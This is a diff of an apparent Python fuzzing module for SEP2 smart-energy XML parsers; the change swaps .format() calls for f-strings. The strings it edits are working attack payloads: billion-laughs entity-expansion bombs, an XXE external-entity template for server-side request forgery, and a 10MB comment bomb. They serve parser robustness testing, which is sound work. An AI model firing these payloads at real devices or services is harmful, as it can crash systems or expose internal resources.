@@ -24,9 +24,8 @@ Vulnerability classes covered:
 
 from __future__ import annotations
 
-from dataclasses import dataclass, field
+from dataclasses import dataclass
 from enum import Enum
-from typing import Optional
 
 
 class VulnClass(Enum):
@@ -133,7 +132,7 @@ def billion_laughs_payloads() -> list[FuzzPayload]:
 
     # Classic 10-level exponential expansion
     # Each entity references the previous 10 times → 10^10 expansions
-    classic = """\
+    classic = f"""\
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE lolz [
   <!ENTITY lol "lol">
@@ -146,11 +145,11 @@ def billion_laughs_payloads() -> list[FuzzPayload]:
   <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
   <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
 ]>
-<EndDevice xmlns="{ns}">
+<EndDevice xmlns="{SEP2_NS}">
   <lFDI>&lol9;</lFDI>
   <sFDI>aabbcc</sFDI>
   <changedTime>0</changedTime>
-</EndDevice>""".format(ns=SEP2_NS)
+</EndDevice>"""
 
     payloads.append(FuzzPayload(
         name        = "billion_laughs_classic",
@@ -162,7 +161,7 @@ def billion_laughs_payloads() -> list[FuzzPayload]:
 
     # Wrapped in a valid SEP2 LogEvent — tests if schema validation happens
     # before or after entity expansion
-    wrapped = """\
+    wrapped = f"""\
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE x [
   <!ENTITY a "aaaaaaaaaa">
@@ -174,14 +173,14 @@ def billion_laughs_payloads() -> list[FuzzPayload]:
   <!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;">
   <!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;">
 ]>
-<LogEvent xmlns="{ns}">
+<LogEvent xmlns="{SEP2_NS}">
   <createdDateTime>0</createdDateTime>
   <details>&h;</details>
   <extendedData>0</extendedData>
   <functionSet>0</functionSet>
   <importance>0</importance>
   <text>test</text>
-</LogEvent>""".format(ns=SEP2_NS)
+</LogEvent>"""
 
     payloads.append(FuzzPayload(
         name        = "billion_laughs_logevent",
@@ -344,19 +343,19 @@ def xxe_ssrf_payloads(
     ]
 
     for url, description in ssrf_targets:
-        body = """\
+        body = f"""\
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE x [
   <!ENTITY ssrf SYSTEM "{url}">
 ]>
-<LogEvent xmlns="{ns}">
+<LogEvent xmlns="{SEP2_NS}">
   <createdDateTime>0</createdDateTime>
   <details>&ssrf;</details>
   <extendedData>0</extendedData>
   <functionSet>0</functionSet>
   <importance>0</importance>
   <text>test</text>
-</LogEvent>""".format(url=url, ns=SEP2_NS)
+</LogEvent>"""
 
         payloads.append(FuzzPayload(
             name        = f"xxe_ssrf_{url.split('/')[2].replace('.', '_').replace(':', '_')}",
@@ -521,8 +520,8 @@ def malformed_payloads() -> list[FuzzPayload]:
         ("comment_bomb",
          f'<?xml version="1.0"?><EndDevice xmlns="{SEP2_NS}">'
          + "<!-- " + "A" * 10_000_000 + " -->"
-         + f'<lFDI>aabb</lFDI><sFDI>aabb</sFDI><changedTime>0</changedTime>'
-         f'</EndDevice>',
+         + '<lFDI>aabb</lFDI><sFDI>aabb</sFDI><changedTime>0</changedTime>'
+         '</EndDevice>',
          "10MB XML comment — tests comment handling memory limits"),
     ]
 
